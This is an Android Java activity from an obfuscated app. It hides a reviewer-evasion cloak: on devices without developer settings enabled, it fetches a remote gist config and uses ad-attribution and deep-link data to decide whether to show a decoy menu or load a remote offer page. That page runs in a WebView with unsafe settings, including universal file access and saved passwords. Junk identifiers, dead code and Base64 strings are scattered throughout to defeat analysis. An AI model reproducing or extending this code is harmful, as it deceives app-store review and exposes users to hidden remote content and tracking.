package com.pshhaora.steecr;

import static com.pshhaora.steecr.ParpshhaoraseStr.decopshhaorade;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.IOException;

import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;


public class P3S2 extends AppCompatActivity {
    public Context conpshhaoratext;
    public static String strDeepshhaorap;
    public static String AD_pshhaoraID;
    private ProgressBar progrpshhaoraessBar;
    private WebView webViepshhaoraw;
    private String lipshhaorank;
    private ValueCallback<Uri[]> myFilePathpshhaoraCallback;
    private SharedPreferences sPrepshhaorafs;
    private String ofpshhaorafer;
    private String fb_Ipshhaorad;
    public static final String URL_SHApshhaoraRED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FIpshhaoraLE_REQUEST_CODE = 1;
    public static String keyDefaupshhapshhaoraoralt;
    public static String statusApppshhaorasFlyer;
    public static String strAppspshhaoraFlyer;
    public static String ApppshhaorasFl_Id;
    public static boolean afLoadpshhaoraed;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.activity_main);
        progrpshhaoraessBar = findViewById(R.id.progressBar);

        int devIpshhaorant = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);

        if ((devIpshhaorant == 0)) {

            conpshhaoratext = this;
            webViepshhaoraw = findViewById(R.id.webView);
            setWpshhaoraebViepshhaoraw(webViepshhaoraw);

            OkHttpClient cliengtpshhaoraraet = new OkHttpClient();
            Request reqgtraeupshhaoraest = new Request.Builder().get().url(ParpshhaoraseStr.GistLpshhaoraink).build();
            okhttp3.Call call = cliengtpshhaoraraet.newCall(reqgtraeupshhaoraest);

            call.enqueue(new Callback() {
                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    dpshhaorang();
                    startActivity(new Intent(getBaseContext(), MenuActivity.class));
                    finish();
                }

                @Override
                public void onResponse(okhttp3.Call call, final okhttp3.Response response) throws IOException {

                    runOnUiThread(() -> {
                        try {
                            String upshhaorarl = response.body().string();
                            String[] parapshhaorams = upshhaorarl.split("\\|");
                            ofpshhaorafer = parapshhaorams[0];
                            keyDefaupshhapshhaoraoralt = parapshhaorams[1];
                            fb_Ipshhaorad = parapshhaorams[2];

                            inipshhaorat(fb_Ipshhaorad, P3S2.this);
                            dpshhaorang();


                            sPrepshhaorafs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            lipshhaorank = sPrepshhaorafs.getString(URL_SHApshhaoraRED_PREF, null);
                            String goegoir = nopshhaoras();
                            if (goegoir == "sdsd") {
                                int hgfh = 1;
                                hgfh++;
                            }


                            if (lipshhaorank != null) {
                                webViepshhaoraw.loadUrl(lipshhaorank);

                            } else {
                                new Handler().postDelayed(() -> {
                                    startWpshhaoraebView(ofpshhaorafer);
                                    dpshhaorang();
                                }, 4812);
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    });
                }
            });
        } else {
            dpshhaorang();
            startActivity(new Intent(getBaseContext(), MenuActivity.class));
            finish();
        }
    }

    void startWpshhaoraebView(String lipshhaorank) {
        if (statusApppshhaorasFlyer != null && statusApppshhaorasFlyer.equals(decopshhaorade("Tm9uLW9yZ2FuaWM="))) {
            String urpshhaoral = lipshhaorank + strAppspshhaoraFlyer;
            Log.i("MyApp", "non-organic - " + urpshhaoral);
            webViepshhaoraw.loadUrl(urpshhaoral);
        } else if (strDeepshhaorap != null) {
            String urpshhaoral = lipshhaorank + strDeepshhaorap;
            webViepshhaoraw.loadUrl(urpshhaoral);
            Log.i("MyApp", "deepLink - " + urpshhaoral);
        } else {
            if (keyDefaupshhapshhaoraoralt.equals("NO")) {
                dpshhaorang();
                startActivity(new Intent(getBaseContext(), MenuActivity.class));
                finish();
            } else {
                String urpshhaoral = new ParpshhaoraseStr().parseOrgpshhaoraanic(lipshhaorank);
                Log.i("MyApp", "organic - " + urpshhaoral);
                webViepshhaoraw.loadUrl(urpshhaoral);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webViepshhaoraw.goBack();
    }


    @Override
    protected void onActivityResult(int requestCpshhaoraode, int resupshhaoraltCode, @Nullable Intent datpshhaoraa) {
        if (requestCpshhaoraode != INPUT_FIpshhaoraLE_REQUEST_CODE || myFilePathpshhaoraCallback == null) {
            super.onActivityResult(requestCpshhaoraode, resupshhaoraltCode, datpshhaoraa);
            return;
        }
        if (resupshhaoraltCode == Activity.RESULT_OK & datpshhaoraa != null) {
            String datapshhaoraString = datpshhaoraa.getDataString();
            Uri[] respshhaorault = new Uri[]{Uri.parse(datapshhaoraString)};
            myFilePathpshhaoraCallback.onReceiveValue(respshhaorault);
            myFilePathpshhaoraCallback = null;
        }
    }


    class MyWebChpshhaoraromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathpshhaoraCallback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER)
                    .putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT)
                            .addCategory(Intent.CATEGORY_OPENABLE)
                            .setType(decopshhaorade("aW1hZ2UvKg=="))), INPUT_FIpshhaoraLE_REQUEST_CODE);
            dpshhaorang();
            return true;
        }
    }

    class MyWebVipshhaoraewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webViepshhaoraw.setVisibility(View.VISIBLE);
            progrpshhaoraessBar.setVisibility(ProgressBar.INVISIBLE);
            dpshhaorang();
            if (url.contains(decopshhaorade("NDA0"))) {
                dpshhaorang();
                startActivity(new Intent(getBaseContext(), MenuActivity.class));
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrepshhaorafs.edit();
            editor.putString(URL_SHApshhaoraRED_PREF, url);
            editor.apply();
        }
    }


    private void setWpshhaoraebViepshhaoraw(WebView webVpshhaoragpy) {
        webVpshhaoragpy.getSettings().setJavaScriptEnabled(true);
        webVpshhaoragpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webVpshhaoragpy.getSettings().setSaveFormData(true);
        webVpshhaoragpy.getSettings().setMixedContentMode(0);
        webVpshhaoragpy.getSettings().setSavePassword(true);
        webVpshhaoragpy.getSettings().setAllowContentAccess(true);
        webVpshhaoragpy.getSettings().setLoadsImagesAutomatically(true);
        webVpshhaoragpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webVpshhaoragpy.getSettings().setDatabaseEnabled(true);
        webVpshhaoragpy.getSettings().setAppCacheEnabled(true);
        webVpshhaoragpy.getSettings().setDomStorageEnabled(true);
        webVpshhaoragpy.getSettings().setAllowContentAccess(true);
        webVpshhaoragpy.getSettings().setAllowFileAccess(true);
        webVpshhaoragpy.getSettings().setAppCacheEnabled(true);
        webVpshhaoragpy.getSettings().setLoadWithOverviewMode(true);
        webVpshhaoragpy.getSettings().setAllowFileAccess(true);
        webVpshhaoragpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webVpshhaoragpy.getSettings().setEnableSmoothTransition(true);
        webVpshhaoragpy.setWebChromeClient(new MyWebChpshhaoraromeClient());
        webVpshhaoragpy.getSettings().setUseWideViewPort(true);
        webVpshhaoragpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webVpshhaoragpy.getSettings().setDomStorageEnabled(true);
        webVpshhaoragpy.setWebViewClient(new MyWebVipshhaoraewClient());
    }


    public void inipshhaorat(String fbpshhaoraId, P3S2 mainActipshhaoravity) {
        FacebookSdk.setApplicationId(fb_Ipshhaorad);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(mainActipshhaoravity.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
        AppEventsLogger.activateApp(mainActipshhaoravity.getApplication());


        AppLinkData.fetchDeferredAppLinkData(mainActipshhaoravity.getApplication(), appLinkData -> {
                    String deepLink = appLinkData.getTargetUri().getQuery();
                    ParpshhaoraseStr parserStr = new ParpshhaoraseStr();
                    strDeepshhaorap = parserStr.parpshhaorase(deepLink);
                }
        );

        new Thread(() -> {
            try {
                AD_pshhaoraID = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                e.printStackTrace();
            }
        }).start();

    }


    String nopshhaoras() {
        int pshhaorassi = 0;
        do {
            pshhaorassi++;
            float d = 434f;

        } while (pshhaorassi > 4);
        return "sdadadasdadasdas";
    }


    public static void dpshhaorang() {
        int[] fjghkfdf = {523, 1123, 213, 12, 312, 3, 4, 2};
        int temp = 0;
        for (int i = 1; i < fjghkfdf.length; i++) {
            for (int j = i; j > 0; j--) {
                if (fjghkfdf[j] < fjghkfdf[j - 1]) {
                    temp = fjghkfdf[j];
                    fjghkfdf[j] = fjghkfdf[j - 1];
                    fjghkfdf[j - 1] = temp;
                }
            }
        }
        for (int i = 0; i < fjghkfdf.length; i++) {
            temp++;
        }


    }
}